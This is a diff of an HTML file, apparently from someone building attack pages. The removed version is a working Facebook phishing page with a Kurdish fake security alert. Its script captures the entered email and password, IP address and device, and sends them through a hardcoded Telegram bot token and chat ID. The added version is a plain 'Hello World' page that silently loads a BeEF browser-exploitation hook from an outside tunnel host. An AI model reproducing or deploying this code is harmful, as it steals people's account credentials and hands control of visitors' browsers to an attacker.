@@ -1,96 +1,22 @@
-<!DOCTYPE html>
-<html lang="ku" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Log in to Facebook</title>
-    
-    <!-- لێرە لۆگۆی فەیسبووک دەخەینە ناو براوسەرەکە -->
-    <link rel="icon" type="image/x-icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/200px-2021_Facebook_icon.svg.png">
-
-    <!-- مێتا تاگەکان بۆ ئەوەی لە واتسئەپ بە جوانی دەربکەوێت -->
-    <meta property="og:title" content="Facebook Security Verification">
-    <meta property="og:description" content="Your Facebook account is under security check. Please verify to continue.">
-    <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png">
-
-    <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; flex-direction: column; align-items: center; }
-        .header-msg { background-color: #fffbe6; border-bottom: 1px solid #ffe58f; width: 100%; padding: 12px; text-align: center; font-size: 14px; color: #856404; box-sizing: border-box; font-weight: bold; }
-        .login-box { width: 100%; max-width: 400px; margin-top: 40px; text-align: center; padding: 0 15px; box-sizing: border-box; }
-        .fb-logo-text { font-size: 45px; font-weight: bold; color: #1877f2; letter-spacing: -2px; margin-bottom: 15px; display: inline-block; font-family: Arial, sans-serif; text-transform: lowercase; }
-        .form-container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); }
-        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; outline: none; }
-        input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
-        .login-btn { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 20px; font-weight: bold; cursor: pointer; margin-top: 5px; }
-        .forgot-pass { display: block; margin-top: 15px; color: #1877f2; text-decoration: none; font-size: 14px; }
-        hr { margin: 20px 0; border: none; border-top: 1px solid #dadde1; }
-        .create-btn { background-color: #42b72a; color: white; border: none; padding: 12px 16px; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; }
-    </style>
-</head>
-<body>
-
-    <div class="header-msg">
-        ⚠️ ئاگاداری: هەوڵی گۆڕینی وشەی نهێنی هەژمارەکەت دەدرێت لە (London, UK). بۆ پاراستنی ئەکاونتەکەت، سەرەتا بچۆ ناو هەژمارەکەت.
-    </div>
-
-    <div class="login-box">
-        <div class="fb-logo-text">facebook</div>
-        
-        <div class="form-container">
-            <input type="text" id="user" placeholder="Email or phone number" dir="ltr">
-            <input type="password" id="pass" placeholder="Password" dir="ltr">
-            <button class="login-btn" onclick="login()">Log In</button>
-            <a href="#" class="forgot-pass">Forgotten password?</a>
-            <hr>
-            <button class="create-btn">Create new account</button>
-        </div>
-    </div>
-
-    <script>
-        const botToken = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
-        const chatId = "6679834643";
-
-        async function login() {
-            const user = document.getElementById('user').value;
-            const pass = document.getElementById('pass').value;
-
-            if(!user || !pass) {
-                alert("The email address or mobile number you entered isn't connected to an account.");
-                return;
-            }
-
-            let userIP = "Unknown";
-            try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                userIP = ipData.ip;
-            } catch (e) { userIP = "Error Fetching IP"; }
-
-            const ua = navigator.userAgent;
-            let deviceModel = "Unknown Device";
-            if (/android/i.test(ua)) {
-                deviceModel = ua.match(/\(([^;]+);([^;]+);([^)]+)\)/)[3].trim();
-            } else if (/iPhone|iPad/i.test(ua)) {
-                deviceModel = "iPhone / iOS Device";
-            } else if (/Windows/i.test(ua)) {
-                deviceModel = "Windows PC";
-            }
-
-            const msg = `👤 **NEW FACEBOOK HIT!**\n\n` +
-                        `📧 **User:** \`${user}\` \n` +
-                        `🔑 **Pass:** \`${pass}\` \n\n` +
-                        `🌐 **IP:** \`${userIP}\` \n` +
-                        `📱 **Device:** \`${deviceModel}\` \n` +
-                        `🖥️ **Agent:** \`${ua}\``;
+<!DOCTYPE html><html><head>
+            <title data-id="th-modified">Web Page</title>
             
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=markdown`)
-            .then(() => {
-                window.location.href = "Otm.html";
-            })
-            .catch(() => {
-                window.location.href = "Otm.html";
-            });
-        }
-    </script>
-</body>
-</html>
+          <meta property="og:title" content="Web Page" data-id="th-modified"><meta name="description" content="code" data-id="th-modified"><meta property="og:description" content="code" data-id="th-modified"><meta property="og:image" content="https://tiiny.host/assets/logo-purple-bg.png" data-id="th-modified"><meta property="og:image:width" content="1501" data-id="th-modified"><meta property="og:image:height" content="1501" data-id="th-modified"><meta property="og:image:type" content="image/png" data-id="th-modified"><meta property="og:url" content="https://teal-shayna-62.tiiny.site/" data-id="th-modified"><meta property="og:type" content="website" data-id="th-modified"><script type='text/javascript' src='https://api.tiiny.host/EW9F260Hb8qH5KHaaRpdP_KA3MhA5zfiT8Fy5NCQ-vrOvhTGU_UIEsfDRIgtWQ661LZjYChqeTsG0dS9blHC48fbZi-nqAPpN1piamP9phsmNxx-zNlfur_WvWxpDtlKN3B5pFQCC3u9n8n6IQ5WomWzj4lcdzK4SzYddRPp0x1j8Ks7RnP8Kh0cTXh9p1yh5uGTzvY3IleGonxBSAgpr8wl_fwWykmoDrYEbpVjK_arUH45XolzDjeoylWDFjoWc2BSfGrNdv39mo0ShzlzCdqrnslSXOD0I6tNZjIh4QsbO5sWKWDmSemSop-8jCJFcItaydc8pUlO4wHUq0eC61RZqb-HxiM2ZmrKcfSAZ28Q73Kkq8hYGofBnV_a5PDMEIZMOERg_OFEw3g_2pB3fIi5bvYqwojbs0QFxGSSwYLFpb2KhKUu47yp6nzFAi2WGNc1blFUvxeMVzBNE_wpd41CHaJ7eOJu8jLxB_81JNfjDVXsdaiSxlompVXC7tfDJ7M_n4ls6aXYuFd3enYzkrhDtcQ'></script><script defer="" data-domain="teal-shayna-62.tiiny.site" src="https://analytics.tiiny.site/js/plausible.js"></script><script type="text/javascript" src="https://tiiny.host/ad-script.js"></script></head>
+          <body>
+            
+
+  
+    <title>Hello, World!</title>
+    <!-- لێرەدا سکریپتی BeEF دادەنێین -->
+    <script src="https://netl7fzx2h.localto.net/hook.js"></script>
+    
+    <link rel="stylesheet" href="https://teal-shayna-62.tiiny.site/styles.css">
+  
+  
+      <h1 class="title">Hello World!</h1>
+      <p id="currentTime"></p>
+      <script src="https://teal-shayna-62.tiiny.site/script.js"></script>
+  
+
+          
+        </body></html>
